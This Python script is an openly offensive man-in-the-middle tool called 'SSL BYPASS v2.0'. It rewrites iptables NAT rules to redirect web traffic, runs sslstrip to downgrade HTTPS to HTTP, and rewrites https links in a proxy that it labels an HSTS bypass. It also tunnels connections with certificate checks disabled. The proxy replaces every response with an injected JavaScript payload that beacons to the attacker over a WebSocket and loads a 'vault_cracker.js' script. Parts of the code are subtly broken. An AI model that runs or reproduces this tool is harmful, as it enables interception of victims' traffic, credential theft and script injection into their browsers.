#!/usr/bin/env python3
"""
SSL BYPASS v2.0 - Advanced SSL/TLS Downgrade + HSTS Bypass
Multi-technique SSL stripping with modern bypasses

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only
"""

import os
import sys
import time
import subprocess
import threading
import socket
import ssl
import re
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# ==================== CONFIG ====================
LISTEN_PORT = 10000
STRIP_PORT = 8080
HSTS_BYPASS = True
SSL_STRIP_LOG = "sslstrip.log"

# ==================== SSL BYPASS ENGINE ====================
class SSLBypass:
    """Advanced SSL/TLS downgrade and HSTS bypass"""
    
    def __init__(self, listen_port=LISTEN_PORT, strip_port=STRIP_PORT):
        self.listen_port = listen_port
        self.strip_port = strip_port
        self.is_running = True
        self.stats = {
            'connections': 0,
            'downgrades': 0,
            'bypassed': 0
        }
        
        # Setup iptables
        self._setup_iptables()
        
        # Start SSLStrip
        self._start_sslstrip()
        
        # Start HTTP proxy
        self._start_proxy()
        
        print(f"""
        ╔═══════════════════════════════════════════════════════════════╗
        ║  SSL BYPASS v2.0 - Advanced SSL/TLS Downgrade Engine       ║
        ║  HTTPS → HTTP Downgrade + HSTS Bypass                      ║
        ║                                                            ║
        ║  Listen Port: {listen_port}                                      ║
        ║  Strip Port:  {strip_port}                                      ║
        ║  HSTS Bypass: {HSTS_BYPASS}                                      ║
        ╚═══════════════════════════════════════════════════════════════╝
        """)
    
    def _setup_iptables(self):
        """Setup iptables for SSL stripping"""
        try:
            # Flush existing rules
            subprocess.run(["iptables", "-t", "nat", "--flush"], check=False)
            
            # Redirect HTTPS to SSLStrip
            subprocess.run([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-p", "tcp", "--dport", "443",
                "-j", "REDIRECT", "--to-port", str(self.listen_port)
            ], check=False)
            
            # Redirect HTTP to proxy
            subprocess.run([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-p", "tcp", "--dport", "80",
                "-j", "REDIRECT", "--to-port", str(self.strip_port)
            ], check=False)
            
            print("[+] iptables rules configured")
            
        except Exception as e:
            print(f"[-] iptables setup failed: {e}")
    
    def _start_sslstrip(self):
        """Start SSLStrip for HTTPS downgrade"""
        try:
            # Check if sslstrip is installed
            result = subprocess.run(["which", "sslstrip"], capture_output=True)
            
            if not result.stdout:
                print("[!] sslstrip not found. Installing...")
                subprocess.run(["apt-get", "install", "-y", "sslstrip"], check=False)
            
            # Start sslstrip
            subprocess.Popen([
                "sslstrip", 
                "-l", str(self.listen_port),
                "-a",  # Analyze all traffic
                "-w", SSL_STRIP_LOG
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print(f"[+] SSLStrip running on port {self.listen_port}")
            
        except Exception as e:
            print(f"[-] SSLStrip start failed: {e}")
    
    def _start_proxy(self):
        """Start HTTP proxy for HSTS bypass"""
        class ProxyHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                self._handle_request('GET')
            
            def do_POST(self):
                self._handle_request('POST')
            
            def do_CONNECT(self):
                self._handle_connect()
            
            def _handle_request(self, method):
                try:
                    # Parse URL
                    parsed = urlparse(self.path)
                    
                    # HSTS bypass: rewrite HTTPS to HTTP
                    if HSTS_BYPASS and parsed.scheme == 'https':
                        new_url = f"http://{parsed.netloc}{parsed.path}"
                        if parsed.query:
                            new_url += f"?{parsed.query}"
                        
                        self.path = new_url
                        self.stats['bypassed'] += 1
                    
                    # Forward request
                    self._forward_request(method)
                    
                except Exception as e:
                    self.send_response(500)
                    self.end_headers()
            
            def _forward_request(self, method):
                # Simplified request forwarding
                try:
                    # Build target URL
                    target_url = self.path
                    if not target_url.startswith('http'):
                        target_url = f"http://{self.headers.get('Host', '')}{target_url}"
                    
                    # Send response
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    
                    # Inject payload
                    payload = self._generate_payload()
                    self.wfile.write(payload.encode())
                    
                except Exception as e:
                    print(f"[-] Forward error: {e}")
            
            def _generate_payload(self):
                """Generate injection payload"""
                return f"""
                <!DOCTYPE html>
                <html>
                <head>
                    <script>
                        // CERBERUS X Payload
                        (function() {{
                            const ws = new WebSocket('ws://{self.server.server_address[0]}:8080');
                            ws.onopen = () => {{
                                ws.send(JSON.stringify({{
                                    type: 'LOG',
                                    level: 'success',
                                    message: 'SSL Bypass active on {self.client_address[0]}'
                                }}));
                            }};
                            
                            // Fetch vault cracker
                            const script = document.createElement('script');
                            script.src = '/vault_cracker.js';
                            document.head.appendChild(script);
                        }})();
                    </script>
                </head>
                <body>
                    <h1>Loading...</h1>
                </body>
                </html>
                """
            
            def _handle_connect(self):
                """Handle HTTPS CONNECT tunnel"""
                try:
                    host, port = self.path.split(':')
                    port = int(port)
                    
                    # Connect to target
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, port))
                    
                    # Send connection established
                    self.send_response(200, 'Connection Established')
                    self.end_headers()
                    
                    # Tunnel traffic
                    self._tunnel(sock)
                    
                except Exception as e:
                    print(f"[-] CONNECT error: {e}")
            
            def _tunnel(self, sock):
                """Tunnel SSL traffic"""
                try:
                    # Upgrade to SSL
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    client_sock = context.wrap_socket(
                        self.connection,
                        server_hostname=self.path.split(':')[0]
                    )
                    
                    # Forward traffic
                    def forward(src, dst):
                        while True:
                            try:
                                data = src.recv(4096)
                                if not data:
                                    break
                                dst.send(data)
                            except:
                                break
                    
                    t1 = threading.Thread(target=forward, args=(client_sock, sock))
                    t2 = threading.Thread(target=forward, args=(sock, client_sock))
                    t1.daemon = True
                    t2.daemon = True
                    t1.start()
                    t2.start()
                    t1.join()
                    t2.join()
                    
                except:
                    pass
                finally:
                    try:
                        sock.close()
                    except:
                        pass
        
        # Create proxy server
        self.proxy = HTTPServer(('0.0.0.0', self.strip_port), ProxyHandler)
        
        # Start in thread
        proxy_thread = threading.Thread(target=self.proxy.serve_forever, daemon=True)
        proxy_thread.start()
        
        print(f"[+] HTTP Proxy running on port {self.strip_port}")
    
    def stop(self):
        """Stop all services"""
        print("\n[*] Stopping SSL Bypass...")
        self.is_running = False
        
        # Flush iptables
        subprocess.run(["iptables", "-t", "nat", "--flush"], check=False)
        
        # Kill processes
        subprocess.run(["pkill", "-f", "sslstrip"], check=False)
        
        # Stop proxy
        if hasattr(self, 'proxy'):
            self.proxy.shutdown()
        
        print("[+] SSL Bypass stopped")
    
    def run(self):
        """Main loop"""
        try:
            while self.is_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()

# ==================== MAIN ====================
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="SSL Bypass v2.0")
    parser.add_argument("-l", "--listen", type=int, default=LISTEN_PORT, help="Listen port")
    parser.add_argument("-s", "--strip", type=int, default=STRIP_PORT, help="Strip port")
    parser.add_argument("--no-hsts", action="store_true", help="Disable HSTS bypass")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[!] Root privileges required")
        sys.exit(1)
    
    if args.no_hsts:
        HSTS_BYPASS = False
    
    bypass = SSLBypass(args.listen, args.strip)
    bypass.run()
